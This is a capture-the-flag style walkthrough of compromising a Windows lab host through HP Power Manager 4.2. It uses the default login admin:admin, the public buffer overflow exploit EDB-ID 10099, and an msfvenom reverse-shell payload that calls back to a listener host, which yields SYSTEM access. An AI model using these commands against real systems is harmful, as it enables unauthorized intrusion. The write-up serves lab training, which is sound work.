# 🏴 Kevin (Windows)

## 🧠 Initial Foothold

- Performed an Nmap scan and found port 80 open.

- Logged into the HP Power Manager web interface using default credentials `admin:admin`.

- Identified the target as vulnerable to:  
  **HP Power Manager 4.2 - Buffer Overflow** ([EDB-ID 10099](https://www.exploit-db.com/exploits/10099))

- Generated a Windows reverse shell payload using `msfvenom`, taking care to exclude the bad characters specified in the exploit documentation:

  ```bash
  msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.45.152 LPORT=443
  ```

- Inserted the generated shellcode into the exploit script after the `n00bn00b` marker:

  ```python
  SHELL = (
  "n00bn00b"
  "\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
  "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
  ...
  )
  ```

- Started a netcat listener with:

  ```bash
  nc -lvp 443
  ```

- Executed the exploit script using Python 2:

  ```bash
  python2 10099.py <target_ip>
  ```

- This provided a SYSTEM-level reverse shell on the target machine.  
  ⚡ No additional privilege escalation was required.

---

🧼 **Post-Exploitation Note:**  
Always validate exploit shellcode structure and listener port matches.

> ⚠️ This walkthrough is for educational purposes only.
